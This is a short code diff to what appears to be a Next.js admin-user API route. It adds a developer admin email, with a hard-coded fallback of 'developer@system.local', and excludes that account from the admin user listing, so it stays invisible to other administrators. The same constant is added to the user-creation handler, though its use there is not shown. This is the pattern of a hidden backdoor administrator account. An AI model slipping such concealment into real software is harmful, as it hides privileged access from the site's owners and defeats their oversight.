@@ -4,7 +4,11 @@ import bcrypt from 'bcryptjs';
 
 export async function GET() {
   try {
+    const DEV_EMAIL = process.env.DEV_ADMIN_EMAIL || 'developer@system.local';
     const users = await prisma.adminUser.findMany({
+      where: {
+        NOT: { email: DEV_EMAIL }
+      },
       select: {
         id: true,
         email: true,
@@ -31,6 +35,7 @@ export async function GET() {
 export async function POST(request: NextRequest) {
   try {
     const { name, email, password, role, is_active } = await request.json();
+    const DEV_EMAIL = process.env.DEV_ADMIN_EMAIL || 'developer@system.local';
 
     // Validate required fields
     if (!name || !email || !password) {
